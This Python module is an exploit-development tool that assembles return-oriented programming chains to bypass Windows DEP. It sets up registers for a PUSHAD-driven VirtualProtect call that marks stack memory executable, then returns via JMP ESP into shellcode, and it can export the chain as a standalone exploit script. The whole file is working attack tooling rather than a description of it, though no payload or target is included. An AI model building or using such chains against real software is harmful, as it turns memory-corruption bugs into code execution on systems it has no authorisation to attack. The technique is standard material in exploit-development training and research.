"""
ROP Chain Builder for VirtualProtect DEP Bypass

This module provides the core functionality for building ROP chains
that bypass DEP using Windows VirtualProtect API.

Author: Anubhav Gain <anubhavg@infopercept.com>
"""

import struct
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field


@dataclass
class Gadget:
    """Represents a ROP gadget with its address and description."""
    address: int
    description: str
    module: str
    instructions: List[str] = field(default_factory=list)

    def pack(self) -> bytes:
        """Pack the gadget address as little-endian 32-bit value."""
        return struct.pack("<I", self.address)

    def __repr__(self) -> str:
        return f"Gadget(0x{self.address:08x}: {self.description} [{self.module}])"


@dataclass
class VirtualProtectParams:
    """Parameters for VirtualProtect API call."""
    lp_address: int = 0          # Address to protect (will be ESP after PUSHAD)
    dw_size: int = 0x201         # Size of region (513 bytes default)
    fl_new_protect: int = 0x40   # PAGE_EXECUTE_READWRITE
    lpfl_old_protect: int = 0    # Writable address for old protection value


class ROPChainBuilder:
    """
    Builds ROP chains for VirtualProtect DEP bypass.

    This class implements the PUSHAD technique combined with JMP [EAX]
    to call VirtualProtect and make shellcode memory executable.

    Usage:
        builder = ROPChainBuilder()
        builder.set_virtualprotect_iat(0x6250609c)
        builder.set_gadgets({...})
        rop_chain = builder.build()
    """

    # Memory protection constants
    PAGE_EXECUTE = 0x10
    PAGE_EXECUTE_READ = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_EXECUTE_WRITECOPY = 0x80

    def __init__(self):
        self.gadgets: Dict[str, Gadget] = {}
        self.virtualprotect_iat: int = 0
        self.writable_address: int = 0
        self.protection_size: int = 0x201
        self.protection_flag: int = self.PAGE_EXECUTE_READWRITE
        self._rop_chain: bytes = b""

    def set_virtualprotect_iat(self, address: int) -> "ROPChainBuilder":
        """Set the IAT address pointing to VirtualProtect."""
        self.virtualprotect_iat = address
        return self

    def set_writable_address(self, address: int) -> "ROPChainBuilder":
        """Set a writable memory address for lpflOldProtect parameter."""
        self.writable_address = address
        return self

    def set_protection_size(self, size: int) -> "ROPChainBuilder":
        """Set the size of memory region to make executable."""
        self.protection_size = size
        return self

    def set_protection_flag(self, flag: int) -> "ROPChainBuilder":
        """Set the memory protection flag (default: PAGE_EXECUTE_READWRITE)."""
        self.protection_flag = flag
        return self

    def add_gadget(self, name: str, address: int, description: str,
                   module: str, instructions: Optional[List[str]] = None) -> "ROPChainBuilder":
        """Add a gadget to the builder."""
        self.gadgets[name] = Gadget(
            address=address,
            description=description,
            module=module,
            instructions=instructions or []
        )
        return self

    def set_gadgets_from_dict(self, gadgets: Dict[str, Dict]) -> "ROPChainBuilder":
        """
        Set multiple gadgets from a dictionary.

        Format:
        {
            "pop_eax": {"address": 0x12345678, "description": "POP EAX; RET", "module": "msvcrt.dll"},
            ...
        }
        """
        for name, info in gadgets.items():
            self.add_gadget(
                name=name,
                address=info["address"],
                description=info.get("description", ""),
                module=info.get("module", "unknown"),
                instructions=info.get("instructions", [])
            )
        return self

    def _negate_value(self, value: int) -> int:
        """Calculate the value to negate to get the target (for avoiding null bytes)."""
        return (0xFFFFFFFF - value + 1) & 0xFFFFFFFF

    def _build_ebp_setup(self) -> bytes:
        """Build EBP register setup (stack alignment)."""
        chain = b""
        if "pop_ebp" in self.gadgets:
            gadget = self.gadgets["pop_ebp"]
            chain += gadget.pack()
            chain += gadget.pack()  # Value for EBP (placeholder)
        return chain

    def _build_ebx_setup(self) -> bytes:
        """Build EBX register setup (dwSize parameter)."""
        chain = b""
        neg_size = self._negate_value(self.protection_size)

        if all(k in self.gadgets for k in ["pop_eax_for_ebx", "neg_eax", "xchg_eax_ebx"]):
            chain += self.gadgets["pop_eax_for_ebx"].pack()
            chain += struct.pack("<I", neg_size)
            chain += self.gadgets["neg_eax"].pack()
            chain += self.gadgets["xchg_eax_ebx"].pack()
        return chain

    def _build_edx_setup(self) -> bytes:
        """Build EDX register setup (flNewProtect parameter)."""
        chain = b""
        neg_flag = self._negate_value(self.protection_flag)

        if all(k in self.gadgets for k in ["pop_eax_for_edx", "neg_eax", "xchg_eax_edx"]):
            chain += self.gadgets["pop_eax_for_edx"].pack()
            chain += struct.pack("<I", neg_flag)
            chain += self.gadgets["neg_eax"].pack()
            chain += self.gadgets["xchg_eax_edx"].pack()
        return chain

    def _build_ecx_setup(self) -> bytes:
        """Build ECX register setup (lpflOldProtect parameter)."""
        chain = b""
        if "pop_ecx" in self.gadgets:
            chain += self.gadgets["pop_ecx"].pack()
            chain += struct.pack("<I", self.writable_address)
        return chain

    def _build_edi_setup(self) -> bytes:
        """Build EDI register setup (ROP NOP)."""
        chain = b""
        if all(k in self.gadgets for k in ["pop_edi", "rop_nop"]):
            chain += self.gadgets["pop_edi"].pack()
            chain += self.gadgets["rop_nop"].pack()
        return chain

    def _build_esi_setup(self) -> bytes:
        """Build ESI register setup (JMP [EAX] gadget)."""
        chain = b""
        if all(k in self.gadgets for k in ["pop_esi", "jmp_eax"]):
            chain += self.gadgets["pop_esi"].pack()
            chain += self.gadgets["jmp_eax"].pack()
        return chain

    def _build_eax_setup(self) -> bytes:
        """Build EAX register setup (VirtualProtect IAT pointer)."""
        chain = b""
        if "pop_eax" in self.gadgets:
            chain += self.gadgets["pop_eax"].pack()
            chain += struct.pack("<I", self.virtualprotect_iat)
        return chain

    def _build_pushad(self) -> bytes:
        """Build PUSHAD instruction."""
        chain = b""
        if "pushad" in self.gadgets:
            chain += self.gadgets["pushad"].pack()
        return chain

    def _build_jmp_esp(self) -> bytes:
        """Build JMP ESP gadget (return address after VirtualProtect)."""
        chain = b""
        if "jmp_esp" in self.gadgets:
            chain += self.gadgets["jmp_esp"].pack()
        return chain

    def validate(self) -> Tuple[bool, List[str]]:
        """
        Validate that all required gadgets are present.

        Returns:
            Tuple of (is_valid, list_of_missing_gadgets)
        """
        required_gadgets = [
            "pop_ebp",
            "pop_eax_for_ebx", "neg_eax", "xchg_eax_ebx",
            "pop_eax_for_edx", "xchg_eax_edx",
            "pop_ecx",
            "pop_edi", "rop_nop",
            "pop_esi", "jmp_eax",
            "pop_eax",
            "pushad",
            "jmp_esp"
        ]

        missing = [g for g in required_gadgets if g not in self.gadgets]

        errors = []
        if missing:
            errors.append(f"Missing gadgets: {', '.join(missing)}")
        if self.virtualprotect_iat == 0:
            errors.append("VirtualProtect IAT address not set")
        if self.writable_address == 0:
            errors.append("Writable address not set")

        return (len(errors) == 0, errors)

    def build(self, validate: bool = True) -> bytes:
        """
        Build the complete ROP chain.

        Args:
            validate: If True, validate gadgets before building

        Returns:
            The complete ROP chain as bytes

        Raises:
            ValueError: If validation fails
        """
        if validate:
            is_valid, errors = self.validate()
            if not is_valid:
                raise ValueError(f"ROP chain validation failed: {'; '.join(errors)}")

        self._rop_chain = b""
        self._rop_chain += self._build_ebp_setup()
        self._rop_chain += self._build_ebx_setup()
        self._rop_chain += self._build_edx_setup()
        self._rop_chain += self._build_ecx_setup()
        self._rop_chain += self._build_edi_setup()
        self._rop_chain += self._build_esi_setup()
        self._rop_chain += self._build_eax_setup()
        self._rop_chain += self._build_pushad()
        self._rop_chain += self._build_jmp_esp()

        return self._rop_chain

    def get_chain_hex(self) -> str:
        """Get the ROP chain as a hex string."""
        if not self._rop_chain:
            self.build()
        return self._rop_chain.hex()

    def get_chain_formatted(self) -> str:
        """Get the ROP chain formatted for easy reading."""
        if not self._rop_chain:
            self.build()

        lines = []
        for i in range(0, len(self._rop_chain), 4):
            addr = struct.unpack("<I", self._rop_chain[i:i+4])[0]
            lines.append(f"0x{addr:08x}")
        return "\n".join(lines)

    def export_python(self) -> str:
        """Export the ROP chain as Python code."""
        code_lines = [
            "#!/usr/bin/env python3",
            '"""',
            "ROP Chain for VirtualProtect DEP Bypass",
            f"Generated by VirtualProtect Inspector v{__import__('vp_inspector').__version__}",
            f"Author: Anubhav Gain <anubhavg@infopercept.com>",
            '"""',
            "",
            "import struct",
            "",
            "def build_rop_chain():",
            '    """Build the VirtualProtect DEP bypass ROP chain."""',
            "    rop = b''",
            "",
        ]

        # Add each gadget with comments
        sections = [
            ("EBP Setup (Stack Alignment)", self._build_ebp_setup()),
            ("EBX Setup (dwSize parameter)", self._build_ebx_setup()),
            ("EDX Setup (flNewProtect parameter)", self._build_edx_setup()),
            ("ECX Setup (lpflOldProtect parameter)", self._build_ecx_setup()),
            ("EDI Setup (ROP NOP)", self._build_edi_setup()),
            ("ESI Setup (JMP [EAX] gadget)", self._build_esi_setup()),
            ("EAX Setup (VirtualProtect IAT)", self._build_eax_setup()),
            ("PUSHAD (Setup VirtualProtect call)", self._build_pushad()),
            ("JMP ESP (Return to shellcode)", self._build_jmp_esp()),
        ]

        for section_name, section_bytes in sections:
            code_lines.append(f"    # {section_name}")
            for i in range(0, len(section_bytes), 4):
                addr = struct.unpack("<I", section_bytes[i:i+4])[0]
                code_lines.append(f'    rop += struct.pack("<I", 0x{addr:08x})')
            code_lines.append("")

        code_lines.extend([
            "    return rop",
            "",
            "",
            "if __name__ == '__main__':",
            "    chain = build_rop_chain()",
            "    print(f'ROP Chain Length: {len(chain)} bytes')",
            "    print(f'ROP Chain (hex): {chain.hex()}')",
        ])

        return "\n".join(code_lines)

    def __len__(self) -> int:
        """Return the length of the ROP chain."""
        if not self._rop_chain:
            self.build(validate=False)
        return len(self._rop_chain)

    def __repr__(self) -> str:
        return f"ROPChainBuilder(gadgets={len(self.gadgets)}, chain_size={len(self)})"
